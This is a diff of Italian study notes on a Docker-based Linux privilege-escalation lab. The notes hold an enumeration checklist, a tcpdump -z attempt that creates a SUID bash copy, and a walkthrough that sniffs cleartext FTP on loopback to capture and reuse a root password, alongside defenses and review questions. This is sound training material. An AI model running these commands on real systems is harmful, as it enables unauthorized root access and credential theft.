@@ -2,8 +2,10 @@
 
 > [!info] Collegamento al corso [[ETHL 0x06 — Hacking Unix p2]] · [[Cron]] · [[Dynamic Linking]] · [[HTB-Wall]] · [[LinPEAS]]
 
+Se vuoi approfondire Linux Hacking, guarda qui [[Linux Hacking Labs]]
 ## 1. Introduzione al Lab
 
+[https://github.com/5ud0ch0p/linux-privesc](https://github.com/5ud0ch0p/linux-privesc)
 Il lab `linux-privesc` è un ambiente Docker-based strutturato per allenare le tecniche di privilege escalation (privesc) su sistemi Linux. Ogni utente parte come `lowpriv` (UID 1000) e deve raggiungere `root` (UID 0) attraverso una serie di vulnerabilità intenzionalmente inserite.
 
 **Caratteristiche principali**:
@@ -45,6 +47,47 @@ Questo lab è la **parte pratica** di ETHL 6: applica ogni concetto in uno scena
 |**0x06**|Dynamic Linking (ld.so.preload)|⭐⭐⭐⭐|1-3|Constructor, /etc/ld.so.preload, dlopen|
 |**0x07**|**Cronjob Privilege Escalation**|⭐⭐|**1-3**|**Script scrivibile, PATH injection, Wildcard**|
 |**0x08**|Capabilities & Restrictions|⭐⭐⭐⭐|1-3|CAP_*, Ambient caps bypass|
+
+## 4. Checklist di Enumerazione (Riutilizzabile)
+
+Prima di ogni livello, esegui questo template di enumerazione:
+
+bash
+
+```bash
+# 1. Chi sei
+id && whoami
+
+# 2. Cosa puoi fare con sudo
+sudo -l
+
+# 3. Cronjob visibili
+cat /etc/crontab
+ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
+cat /var/spool/cron/root 2>/dev/null
+cat /var/spool/cron/highpriv 2>/dev/null   # misconfig se leggibile
+
+# 4. Monitoraggio processi (per vedere cron job nascosti)
+watch -n1 'ps aux | grep -v "lowpriv\|watch\|ps\|grep"'
+
+# 5. SUID/SGID binaries
+find / -perm /4000 -type f 2>/dev/null
+find / -perm /2000 -type f 2>/dev/null
+
+# 6. Capabilities
+getcap -r / 2>/dev/null
+
+# 7. File con permessi scrivibili in path critici
+find /etc /tmp /var -writable -type f 2>/dev/null
+
+# 8. File creati di recente (dopo config-privescs)
+find / -newer /etc/crontab -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null
+
+# 9. Porte aperte / servizi in ascolto
+ss -tlnup
+```
+
+
 
 ---
 
@@ -181,6 +224,13 @@ Script: /bin/bash -p
 root (uid=0) 🎯
 ```
 
+#### Concetti chiave
+
+- **EUID vs RUID**: SUID imposta l'EUID (UID effettivo usato per i permessi), non il RUID (UID reale, chi sei davvero). `sudo -l` guarda il RUID → non funzionava dalla shell SUID.
+- **PATH injection**: se un SUID binary chiama comandi con path relativo, controlla il PATH dell'utente che lo lancia — non il PATH di root.
+- **bash -p**: senza `-p`, bash degrada i privilegi se EUID ≠ RUID. Con `-p` li mantiene.
+- **Difesa**: usare sempre path assoluti (`/usr/bin/python3`) nei binari privilegiati.
+
 #### Defesa
 
 1. **Path assoluto**: Usare `system("/usr/bin/python3 ...")` invece di `system("python3 ...")`
@@ -196,9 +246,102 @@ Questo è **Method 2** da [[Cron#7. I 3 metodi di exploit]]:
 
 La differenza: invece di un cronjob, è un binario SUID. La vulnerabilità di base è identica.
 
-### Level 2 — [TBD: probabilmente PATH insecuro su script cron]
+### Level 2 ✅ — sudo tcpdump + FTP Credential Sniffing + Password Reuse
+
+**Vettore**: `sudo tcpdump` → sniffing del loopback → credenziali FTP in chiaro → password reuse su root.
+
+#### Enumerazione
+
+bash
+
+```bash
+sudo -l
+# → (root) /usr/sbin/tcpdump
+# Solo tcpdump disponibile via sudo — nessun cronjob visibile in /etc/crontab
+```
+
+Primo tentativo — GTFOBins tcpdump `-z` per esecuzione comandi:
+
+bash
+
+```bash
+TF=$(mktemp)
+cat > $TF << 'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/bash
+chmod u+s /tmp/bash
+EOF
+chmod +x $TF
+
+sudo tcpdump -w /dev/null -G 1 -W 1 -z $TF
+# Output: "dropped privs to tcpdump"
+# /tmp/bash → owner: tcpdump, non root → EUID=72, non 0
+```
+
+> [!warning] Privilege Drop Le versioni moderne di tcpdump fanno `setuid(tcpdump)` dopo aver aperto l'interfaccia di rete. Il flag `-z` (postrotate command) viene eseguito **dopo** il drop — quindi come utente `tcpdump` (uid=72), non root. GTFOBins funziona solo su versioni più vecchie senza questo comportamento.
+
+#### Pivot — Monitoraggio processi
+
+bash
+
+```bash
+watch -n1 'ps aux | grep -v "lowpriv\|watch\|ps\|grep"'
+```
+
+Trovato processo cron ricorrente eseguito come root:
+
+```
+root  2840  /bin/sh -c (sleep 2; echo -e "USER admin\r\nPASS ..." ) | nc localhost 21
+root  2842  nc localhost 21
+root  2844  vsftpd
+```
+
+Un cronjob root si autentica a **vsftpd** (FTP) su localhost via `nc`. FTP è un protocollo in **chiaro** — le credenziali viaggiano non cifrate nel payload TCP.
+
+#### Exploit — Sniffing del loopback
+
+bash
+
+```bash
+sudo tcpdump -i lo -A -s 0 port 21
+# -i lo   : interfaccia loopback (dove viaggia localhost)
+# -A      : stampa payload in ASCII
+# -s 0    : cattura il pacchetto intero
+```
+
+Output catturato:
+
+```
+USER admin
+...
+PASS n0pn0pn0pjmp
+```
+
+#### Escalation
+
+bash
+
+```bash
+# admin non esiste come utente di sistema
+cat /etc/passwd | grep admin   # → nessun risultato
+
+# Password reuse su root
+su root
+# Password: n0pn0pn0pjmp
+# → root shell ✅
+```
+
+#### Concetti chiave
+
+- **FTP è cleartext**: username e password viaggiano in chiaro nel payload TCP — visibili a chiunque possa sniffare il traffico (tcpdump, Wireshark, ecc.). SSH/SFTP risolvono il problema.
+- **Loopback è sniffabile**: `127.0.0.1` non è "sicuro" dalla prospettiva del sniffing — chiunque abbia accesso a `tcpdump -i lo` può leggere tutto il traffico localhost.
+- **sudo tcpdump**: anche se il privilege drop impedisce l'esecuzione di comandi come root via `-z`, tcpdump può comunque **leggere** traffico di rete privilegiato → vettore di information disclosure.
+- **Password reuse**: credenziali usate in un servizio applicativo (FTP) non devono mai coincidere con credenziali di sistema, specialmente root.
+- **Difesa**: usare SFTP/SCP al posto di FTP; non usare password di root per servizi applicativi; isolare i servizi da loopback se possibile.
 
 ### Level 3 — [TBD: probabilmente Wildcard Injection con tar]
+
+
 
 ---
 
@@ -265,6 +408,20 @@ ls -ld /etc/
 4. **Isolamento dei privilegi**: `setuid(0)` diventa root pieno, non solo "elevazione parziale" — grande differenza
 5. **Fake binari**: Non è un "bypass" del sistema — stai solo controllando quale file eseguibile viene trovato prima nel PATH
 
+extra:
+## 6. Lezioni per l'Esame
+
+> [!tip] Cosa ricordare
+> 
+> - **Method 1 (script scrivibile)**: script cron a cui hai accesso write → sovrascrivi con reverse shell
+> - **Method 2 (PATH injection)**: comando con path relativo + PATH che controlli → metti fake binary prima
+> - **Method 3 (wildcard)**: cronjob con `*` non quotato → crea file con nome falso come flag/opzione tar
+> - **LinPEAS non è "find all vulns"** — è "find plausible vectors" — tutti i rossi vanno verificati a mano
+> - **Container ≠ VM** — kernel condiviso, isolamento via namespace (non hypervisor)
+> - **GTFOBins non è infallibile** — il comportamento dipende dalla versione del binary (es. privilege drop in tcpdump)
+> - **Monitorare i processi** è fondamentale quando i crontab non sono leggibili — `watch -n1 ps aux`
+> - **FTP in chiaro** — se vedi vsftpd + tcpdump disponibile, sniffa il loopback
+
 ---
 
 ## 7. Domande di richiamo attivo
@@ -274,3 +431,12 @@ ls -ld /etc/
 3. Se usi `system("/bin/sh -c \"comando\"")`, quale PATH eredita `comando` — quello di chi ha lanciato il binario, o quello di root?
 4. Come saresti bloccato se il wrapper usasse `/usr/bin/python3` (path assoluto) invece di `python3`?
 5. Cosa fa `hash -r` in bash?
+
+domande 2:
+- Perché `sudo -l` non funzionava dalla shell SUID nel Level 1?
+- Qual è la differenza tra EUID e RUID? Chi usa quale?
+- Perché `bash -p` è necessario in una shell lanciata da un SUID binary?
+- Cosa fa esattamente `tcpdump -z`? Perché fallisce come vettore root su tcpdump moderno?
+- Perché FTP su loopback (`localhost`) non è sicuro dalla prospettiva del sniffing?
+- In un pentest reale, cosa faresti invece di aprire una shell interattiva come root?
+- Come difenderesti un sistema da credential sniffing via tcpdump?
